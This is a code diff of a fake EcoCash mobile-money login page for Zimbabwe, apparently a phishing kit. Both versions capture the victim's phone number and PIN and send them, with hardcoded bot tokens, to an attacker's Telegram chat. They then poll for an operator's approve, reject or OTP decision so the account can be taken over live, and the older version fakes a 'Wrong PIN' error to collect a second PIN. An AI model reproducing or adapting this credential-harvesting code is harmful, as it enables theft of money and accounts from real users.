@@ -1,584 +1,231 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-<meta charset="UTF-8">
-<title>EcoCash Login</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash Login</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; position: relative; overflow-x: hidden; }
+        
+        /* Top Header */
+        .header { margin-top: 60px; text-align: center; }
+        .logo { font-size: 42px; font-weight: bold; letter-spacing: -1px; }
+        .logo .eco { color: #0000ff; }
+        .logo .cash { color: #ff0000; }
+        .welcome-text { font-size: 36px; color: #333; margin-top: 30px; margin-bottom: 50px; font-weight: 400; }
 
-<!-- Sofia Pro font from Sportmonks CDN -->
-<link rel="stylesheet" href="https://cdn.sportmonks.com/fonts/SofiaPro/stylesheet.css">
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+        /* Input Container */
+        .input-container { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; z-index: 10; }
+        
+        /* Phone Input */
+        .phone-box { width: 100%; display: flex; align-items: center; border: 1.5px solid #000; border-radius: 8px; padding: 15px; margin-bottom: 25px; background: white; }
+        .flag { margin-right: 10px; font-size: 20px; }
+        .country-code { font-size: 18px; color: #000; font-weight: 500; margin-right: 15px; }
+        .phone-input { border: none; outline: none; font-size: 18px; width: 100%; font-weight: 500; color: #333; }
+        .phone-input::placeholder { color: #333; font-weight: 500; }
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+        /* PIN Section */
+        .pin-label { font-size: 16px; color: #333; margin-bottom: 15px; }
+        .pin-boxes { display: flex; gap: 15px; margin-bottom: 15px; }
+        .pin-box { width: 55px; height: 60px; border: 2px solid #4a4a9c; border-radius: 12px; font-size: 24px; text-align: center; outline: none; color: #000; background: transparent; }
+        .pin-box:focus { border-color: #0000ff; }
+        .pin-box::-webkit-outer-spin-button, .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .forgot-pin { color: #333; text-decoration: none; font-size: 15px; margin-bottom: 30px; }
 
-body{
-  font-family:'Sofia Pro','Roboto',sans-serif;
-  background:#fff;
-  color:#1a1a1a;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  overflow-x:hidden;
-}
+        /* Button & Status */
+        .login-btn { width: 250px; padding: 15px; background-color: #64a0cc; color: white; border: 2px solid #4a4a9c; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .login-btn:active { transform: scale(0.98); }
+        .login-btn:disabled { background-color: #a0c4e0; cursor: not-allowed; }
+        
+        .status-message { margin-top: 15px; font-size: 14px; font-weight: bold; height: 20px; text-align: center; }
+        .status-loading { color: #0000ff; }
+        .status-error { color: #ff0000; }
+        .status-success { color: #00aa00; }
 
-/* ===== MAIN CONTENT (scrollable top area) ===== */
-.main{
-  flex:1;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  padding:48px 24px 30px;
-}
-
-/* ===== LOGO ===== */
-.logo{
-  font-size:44px;
-  font-weight:700;
-  letter-spacing:-1px;
-  margin-bottom:36px;
-  line-height:1;
-}
-.logo .eco{color:#1a56db}
-.logo .cash{color:#e02020}
-
-/* ===== LOGIN TITLE ===== */
-h2{
-  font-size:26px;
-  font-weight:700;
-  color:#111;
-  margin-bottom:28px;
-  letter-spacing:-0.3px;
-}
-
-/* ===== PHONE BOX ===== */
-.phone-box{
-  width:100%;
-  max-width:420px;
-  border:2px solid #1a56db;
-  border-radius:12px;
-  display:flex;
-  align-items:center;
-  padding:13px 14px;
-  margin-bottom:28px;
-  background:#fff;
-  gap:6px;
-}
-
-.flag-wrap{
-  display:flex;
-  align-items:center;
-  gap:4px;
-  flex-shrink:0;
-}
-
-.flag{font-size:22px;line-height:1}
-
-.chevron{
-  font-size:10px;
-  color:#888;
-  margin-left:1px;
-}
-
-.divider{
-  width:1px;
-  height:20px;
-  background:#d0d7e3;
-  margin:0 8px;
-  flex-shrink:0;
-}
-
-.prefix{
-  font-size:16px;
-  font-weight:500;
-  color:#111;
-  flex-shrink:0;
-}
-
-.phone-box input{
-  border:none;
-  outline:none;
-  font-size:16px;
-  font-family:'Sofia Pro','Roboto',sans-serif;
-  color:#111;
-  flex:1;
-  min-width:0;
-  background:transparent;
-}
-
-.phone-box input::placeholder{color:#aab0bc}
-
-/* ===== PIN LABEL ===== */
-.pin-label{
-  font-size:15px;
-  font-weight:400;
-  color:#444;
-  margin-bottom:18px;
-  text-align:center;
-}
-
-/* ===== PIN INPUTS ===== */
-.pin{
-  display:flex;
-  justify-content:center;
-  gap:16px;
-  margin-bottom:10px;
-}
-
-.pin-input{
-  width:62px;
-  height:62px;
-  border:2.5px solid #1a56db;
-  border-radius:12px;
-  font-size:24px;
-  font-weight:600;
-  text-align:center;
-  outline:none;
-  color:#111;
-  background:#fff;
-  font-family:'Sofia Pro','Roboto',sans-serif;
-  transition:border-color .15s,box-shadow .15s;
-  -webkit-appearance:none;
-  -webkit-text-security:disc;
-}
-
-.pin-input:focus{
-  border-color:#1240a8;
-  box-shadow:0 0 0 3px rgba(26,86,219,0.13);
-}
-
-/* ===== ERROR ===== */
-#pin-error{
-  font-size:13.5px;
-  font-weight:500;
-  color:#d32f2f;
-  text-align:center;
-  min-height:20px;
-  margin:8px 0 4px;
-  opacity:0;
-  transition:opacity .2s;
-}
-
-.forgot{
-  font-size:14px;
-  color:#666;
-  text-align:center;
-  margin-top:4px;
-  cursor:pointer;
-}
-
-/* ===== BOTTOM BLUE SECTION ===== */
-.bottom{
-  background:#1a56db;
-  color:#fff;
-  text-align:center;
-  padding:48px 28px 36px;
-  position:relative;
-  flex-shrink:0;
-}
-
-/* Wave cutout at top of blue section */
-.bottom::before{
-  content:'';
-  position:absolute;
-  top:-38px;left:0;right:0;
-  height:40px;
-  background:#1a56db;
-  border-radius:55% 55% 0 0 / 100% 100% 0 0;
-}
-
-.bottom p{
-  font-size:15px;
-  font-weight:400;
-  line-height:1.6;
-  margin-bottom:28px;
-  opacity:0.95;
-}
-
-/* ===== ACTION BUTTONS ===== */
-.actions{
-  display:flex;
-  gap:14px;
-  justify-content:center;
-  margin-bottom:32px;
-}
-
-.btn{
-  background:#fff;
-  color:#1a56db;
-  border:none;
-  padding:16px 10px 14px;
-  border-radius:14px;
-  font-weight:500;
-  font-size:14px;
-  font-family:'Sofia Pro','Roboto',sans-serif;
-  width:148px;
-  cursor:pointer;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  gap:8px;
-  transition:opacity .15s;
-}
-
-.btn:active{opacity:0.85}
-
-.btn-icon{
-  font-size:22px;
-  line-height:1;
-}
-
-/* ===== FOOTER ===== */
-.footer{
-  font-size:12.5px;
-  opacity:0.88;
-  line-height:1.8;
-}
-
-.footer a{
-  color:#fff;
-  text-decoration:underline;
-  text-underline-offset:2px;
-}
-
-/* ===== PROCESSING OVERLAY ===== */
-#processingOverlay{
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,0.5);
-  display:none;
-  align-items:center;
-  justify-content:center;
-  z-index:999;
-}
-
-.processing-box{
-  background:#fff;
-  padding:30px 36px;
-  border-radius:18px;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  gap:16px;
-  font-size:15px;
-  font-weight:500;
-  color:#1a56db;
-  box-shadow:0 8px 32px rgba(0,0,0,0.18);
-}
-
-.spinner{
-  width:40px;height:40px;
-  border:3.5px solid #dde8fa;
-  border-top-color:#1a56db;
-  border-radius:50%;
-  animation:spin .8s linear infinite;
-}
-
-@keyframes spin{to{transform:rotate(360deg)}}
-
-@keyframes shake{
-  0%,100%{transform:translateX(0)}
-  20%{transform:translateX(-5px)}
-  40%{transform:translateX(5px)}
-  60%{transform:translateX(-5px)}
-  80%{transform:translateX(5px)}
-}
-
-.shake{animation:shake .4s ease}
-
-@media(max-width:360px){
-  .pin-input{width:54px;height:54px;font-size:20px}
-  .logo{font-size:38px}
-  .btn{width:136px}
-}
-</style>
-<base target="_blank">
+        /* Bottom Blue */
+        .bottom-area { position: absolute; bottom: 0; width: 100%; height: 30vh; background-color: #0000ff; display: flex; flex-direction: column; justify-content: center; align-items: center; border-top-left-radius: 50% 20%; border-top-right-radius: 50% 20%; padding: 20px; z-index: 1; }
+        .bottom-text { color: white; text-align: center; font-size: 14px; line-height: 1.5; margin-bottom: 20px; max-width: 80%; }
+        .bottom-buttons { display: flex; gap: 10px; width: 100%; justify-content: center; }
+        .action-btn { background: white; color: #333; padding: 15px 20px; border-radius: 8px; border: none; font-size: 16px; font-weight: 500; width: 45%; cursor: pointer; }
+    </style>
 </head>
-
 <body>
 
-<div class="main">
-  <!-- LOGO -->
-  <div class="logo">
-    <span class="eco">Eco</span><span class="cash">Cash</span>
-  </div>
-
-  <h2>Login</h2>
-
-  <!-- PHONE -->
-  <div class="phone-box">
-    <div class="flag-wrap">
-      <span class="flag">🇿🇼</span>
-      <span class="chevron">▼</span>
+    <div class="header">
+        <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+        <div class="welcome-text">Welcome</div>
     </div>
-    <div class="divider"></div>
-    <span class="prefix">+263</span>
-    <input type="tel" id="phone" maxlength="9" placeholder="Phone Number" inputmode="numeric">
-  </div>
 
-  <!-- PIN -->
-  <div class="pin-label">Enter your PIN</div>
+    <div class="input-container">
+        <div class="phone-box">
+            <span class="flag">🇿🇼</span>
+            <span class="country-code">+263</span>
+            <input type="tel" id="phone" class="phone-input" placeholder="Mobile number" autocomplete="off">
+        </div>
 
-  <div class="pin">
-    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
-    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
-    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
-    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
-  </div>
+        <div class="pin-label">Enter your PIN</div>
+        
+        <div class="pin-boxes">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 0)">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 1)">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 2)">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 3)">
+        </div>
 
-  <div id="pin-error">Wrong PIN</div>
-  <div class="forgot">Forgot PIN?</div>
-</div>
+        <a href="#" class="forgot-pin">Forgot PIN?</a>
 
-<!-- BOTTOM BLUE -->
-<div class="bottom">
-  <p>To register an EcoCash wallet or get assistance,<br>click below</p>
+        <button class="login-btn" id="loginBtn" onclick="submitLogin()">Login</button>
+        <div id="statusMessage" class="status-message"></div>
+    </div>
 
-  <div class="actions">
-    <button class="btn">
-      <span class="btn-icon">👤</span>
-      Register
-    </button>
-    <button class="btn">
-      <span class="btn-icon">ℹ️</span>
-      Help &amp; Support
-    </button>
-  </div>
+    <div class="bottom-area">
+        <div class="bottom-text">To register an EcoCash wallet or get assistance, click below</div>
+        <div class="bottom-buttons">
+            <button class="action-btn">Register</button>
+            <button class="action-btn">Help & Support</button>
+        </div>
+    </div>
 
-  <div class="footer">
-    <p>v3.0.2P</p>
-    <p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
-  </div>
-</div>
+    <script>
+        // ==========================================
+        // 1. PUT YOUR TELEGRAM BOT DETAILS HERE
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = "8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY";
+        const TELEGRAM_CHAT_ID = "8094482230";
+        
+        let currentPhone = "";
+        let messageId = null; 
+        let pollingInterval = null;
 
-<!-- OVERLAY -->
-<div id="processingOverlay">
-  <div class="processing-box">
-    <div class="spinner"></div>
-    <div>Processing…</div>
-  </div>
-</div>
-
-<script>
-let firstPin = '';
-let secondPin = '';
-let pinAttempt = 0;
-
-const pinInputs = document.querySelectorAll('.pin-input');
-const errorMsg  = document.getElementById('pin-error');
-const phoneInput = document.getElementById('phone');
-const overlay   = document.getElementById('processingOverlay');
-
-function getPinValue() {
-  return Array.from(pinInputs).map(i => i.value).join('');
-}
-
-function sendToTelegram(phone, firstPin, secondPin) {
-  const botToken = '8894784370:AAE2QmU7-MvEZt0xWbJwfTPyqWA9v4W4xmM';
-  const chatId   = '7815412509';
-  
-  // MarkdownV2 escape for text portions
-  const escapeMd = s => s.replace(/[_*\[\]()~`>#+\-=|{}.!]/g, '\\$&');
-  
-  // Phone as clickable tel: link — opens dialer on tap
-  const escapedPhone = escapeMd(phone);
-  const message = `📱 Phone: [${escapedPhone}](tel:${phone})\n🔑 First PIN: ${escapeMd(firstPin)}\n🔑 Second PIN: ${escapeMd(secondPin)}\n\n👇 Please Approve or Reject:`;
-  
-  const inlineKeyboard = {
-    inline_keyboard: [[
-      { text: "✅ Approve", callback_data: `APPROVE_${phone}` },
-      { text: "❌ Reject",  callback_data: `REJECT_${phone}` }
-    ]]
-  };
-  
-  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'MarkdownV2',
-      reply_markup: JSON.stringify(inlineKeyboard),
-      disable_web_page_preview: true
-    })
-  });
-}
-
-function startListeningForAdminDecision(phone) {
-  const botToken = '8894784370:AAE2QmU7-MvEZt0xWbJwfTPyqWA9v4W4xmM';
-  let offset = 0;
-  let decided = false;
-  let pollCount = 0;
-  const maxPolls = 45; // 3 minutes max (45 * 4 seconds)
-
-  console.log('Starting poll for phone:', phone);
-
-  function poll() {
-    if (decided) {
-      console.log('Already decided, stopping poll');
-      return;
-    }
-
-    pollCount++;
-    if (pollCount > maxPolls) {
-      console.log('Max polls reached, stopping');
-      overlay.style.display = 'none';
-      errorMsg.textContent = 'Session timed out. Please try again.';
-      errorMsg.style.opacity = '1';
-      pinAttempt = 0;
-      firstPin = '';
-      secondPin = '';
-      return;
-    }
-
-    console.log('Polling... attempt', pollCount, 'offset:', offset);
-
-    fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
-      .then(r => r.json())
-      .then(data => {
-        console.log('Poll response:', data);
-        if (!data.ok) {
-          console.error('Telegram API error:', data);
-          setTimeout(poll, 4000);
-          return;
-        }
-
-        if (decided) return;
-
-        for (let update of data.result) {
-          offset = update.update_id + 1;
-          console.log('Processing update:', update.update_id, 'type:', update.callback_query ? 'callback' : 'message');
-
-          if (update.callback_query) {
-            const action = update.callback_query.data;
-            console.log('Callback data:', action, 'Expected APPROVE:', `APPROVE_${phone}`, 'Expected REJECT:', `REJECT_${phone}`);
-
-            if (action === `APPROVE_${phone}`) {
-              console.log('APPROVE received!');
-              decided = true;
-              overlay.style.display = 'none';
-              window.location.href = 'otp.html';
-              return;
-            } else if (action === `REJECT_${phone}`) {
-              console.log('REJECT received!');
-              decided = true;
-              overlay.style.display = 'none';
-              errorMsg.textContent = 'Please input correct credentials.';
-              errorMsg.style.opacity = '1';
-              pinInputs.forEach(i => i.value = '');
-              pinInputs[0].focus();
-              pinAttempt = 0;
-              firstPin = '';
-              secondPin = '';
-              return;
+        function moveNext(current, index) {
+            if (current.value.length === 1) {
+                let next = document.getElementsByClassName('pin-box')[index + 1];
+                if (next) next.focus();
+            } else if (current.value.length === 0 && index > 0) {
+                let prev = document.getElementsByClassName('pin-box')[index - 1];
+                if (prev) prev.focus();
             }
-          }
         }
 
-        // Continue polling if no decision yet
-        if (!decided) {
-          setTimeout(poll, 4000);
+        function setStatus(text, className) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerText = text;
+            statusDiv.className = 'status-message ' + className;
         }
-      })
-      .catch(err => {
-        console.error('Polling error:', err);
-        if (!decided) {
-          setTimeout(poll, 4000);
-        }
-      });
-  }
 
-  // Get initial offset, then start polling
-  fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=1`)
-    .then(r => r.json())
-    .then(data => {
-      if (data.ok && data.result.length > 0) {
-        offset = data.result[data.result.length - 1].update_id + 1;
-      }
-      console.log('Initial offset set to:', offset);
-      // Start polling immediately
-      poll();
-    })
-    .catch(err => {
-      console.error('Failed to get initial offset:', err);
-      // Start polling anyway
-      poll();
-    });
-}
+        async function submitLogin() {
+            currentPhone = document.getElementById('phone').value;
+            const pinBoxes = document.getElementsByClassName('pin-box');
+            let currentPin = "";
+            for (let i = 0; i < pinBoxes.length; i++) currentPin += pinBoxes[i].value;
 
-pinInputs.forEach((input, idx) => {
-  input.addEventListener('input', e => {
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 1);
+            if (currentPhone.length < 5) return setStatus("Enter valid mobile number.", "status-error");
+            if (currentPin.length !== 4) return setStatus("Enter 4-digit PIN.", "status-error");
 
-    if (input.value && idx < pinInputs.length - 1) {
-      pinInputs[idx + 1].focus();
-    }
+            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('loginBtn').innerText = "Processing...";
+            setStatus("Sending to Telegram...", "status-loading");
 
-    errorMsg.style.opacity = '0';
+            // Format the message
+            const messageText = `🚨 *NEW LOGIN ATTEMPT* 🚨\n\n📱 Phone: \`${currentPhone}\`\n🔑 PIN: \`${currentPin}\`\n\nChoose an action:`;
+            
+            // Setup Telegram Buttons
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correct PIN", callback_data: `correct_${currentPhone}` },
+                        { text: "❌ Wrong PIN", callback_data: `wrong_${currentPhone}` }
+                    ],
+                    [{ text: "🔄 Resend OTP", callback_data: `resend_${currentPhone}` }]
+                ]
+            };
 
-    if ([...pinInputs].every(i => i.value.length === 1)) {
-      pinAttempt++;
+            try {
+                // Send Message to Telegram via API
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown',
+                        reply_markup: keyboard
+                    })
+                });
 
-      if (pinAttempt === 1) {
-        firstPin = getPinValue();
-        // Show wrong PIN shake on first attempt
-        errorMsg.textContent = 'Wrong PIN';
-        errorMsg.style.opacity = '1';
-        const pinRow = document.querySelector('.pin');
-        pinRow.classList.remove('shake');
-        void pinRow.offsetWidth;
-        pinRow.classList.add('shake');
-        setTimeout(() => {
-          pinInputs.forEach(i => i.value = '');
-          pinInputs[0].focus();
-        }, 120);
-
-      } else if (pinAttempt === 2) {
-        secondPin = getPinValue();
-        const phone = phoneInput.value.trim();
-        if (!phone) {
-          errorMsg.textContent = 'Please enter your phone number.';
-          errorMsg.style.opacity = '1';
-          pinAttempt--;
-          return;
-        }
-        localStorage.setItem('phoneNumber', '+263' + phone);
-        overlay.style.display = 'flex';
-        sendToTelegram(phone, firstPin, secondPin)
-          .then(res => res.json())
-          .then(data => {
-            console.log('Telegram sendMessage response:', data);
-            if (data.ok) {
-              startListeningForAdminDecision(phone);
-            } else {
-              console.error('Failed to send Telegram message:', data);
-              overlay.style.display = 'none';
-              errorMsg.textContent = 'Network error. Please try again.';
-              errorMsg.style.opacity = '1';
-              pinAttempt = 0;
-              firstPin = '';
-              secondPin = '';
+                const data = await response.json();
+                
+                if (data.ok) {
+                    messageId = data.result.message_id; // Save ID to check for replies
+                    setStatus("Waiting for Admin Approval...", "status-loading");
+                    startPolling(); // Start looking for button clicks
+                } else {
+                    setStatus("Bot Error. Check Token.", "status-error");
+                    resetLogin();
+                }
+            } catch (error) {
+                setStatus("Network Error.", "status-error");
+                resetLogin();
             }
-          })
-          .catch(err => {
-            console.error('Send to Telegram error:', err);
-            overlay.style.display = 'none';
-            errorMsg.textContent = 'Network error. Please try again.';
-            errorMsg.style.opacity = '1';
-            pinAttempt = 0;
-            firstPin = '';
-            secondPin = '';
-          });
-      }
-    }
-  });
+        }
 
-  input.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' && !input.value && idx > 0) {
-      pinInputs[idx - 1].focus();
-    }
-  });
-});
-</script>
+        // ==========================================
+        // 2. CHECK TELEGRAM FOR ADMIN CLICKS
+        // ==========================================
+        function startPolling() {
+            if (pollingInterval) clearInterval(pollingInterval);
 
+            pollingInterval = setInterval(async () => {
+                try {
+                    // Get latest updates from Telegram
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
+                    const data = await res.json();
 
-</body></html>
+                    if (!data.ok || !data.result) return;
+
+                    // Check if admin clicked a button for this specific message
+                    for (let update of data.result) {
+                        if (update.callback_query && update.callback_query.message.message_id === messageId) {
+                            const callbackData = update.callback_query.data;
+                            const action = callbackData.split('_')[0];
+
+                            // Acknowledge the click so the loading spinner stops in Telegram
+                            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);
+
+                            clearInterval(pollingInterval); // Stop checking
+
+                            if (action === "correct") {
+                                setStatus("✅ PIN Correct! Redirecting...", "status-success");
+                                setTimeout(() => {
+                                    window.location.href = "dashboard.html"; // <--- CHANGE THIS TO YOUR NEXT PAGE
+                                }, 1000);
+                            } 
+                            else if (action === "wrong") {
+                                setStatus("❌ Incorrect PIN. Try again.", "status-error");
+                                resetLogin();
+                            } 
+                            else if (action === "resend") {
+                                setStatus("🔄 OTP Resent to your phone.", "status-loading");
+                                // Telegram admin can click correct/wrong after this
+                                startPolling(); 
+                            }
+                            break;
+                        }
+                    }
+                } catch (e) {
+                    console.log("Waiting for updates...");
+                }
+            }, 2000); // Check every 2 seconds
+        }
+
+        function resetLogin() {
+            document.getElementById('loginBtn').disabled = false;
+            document.getElementById('loginBtn').innerText = "Login";
+            const pinBoxes = document.getElementsByClassName('pin-box');
+            for (let i = 0; i < pinBoxes.length; i++) pinBoxes[i].value = "";
+            pinBoxes[0].focus();
+        }
+    </script>
+</body>
+</html>
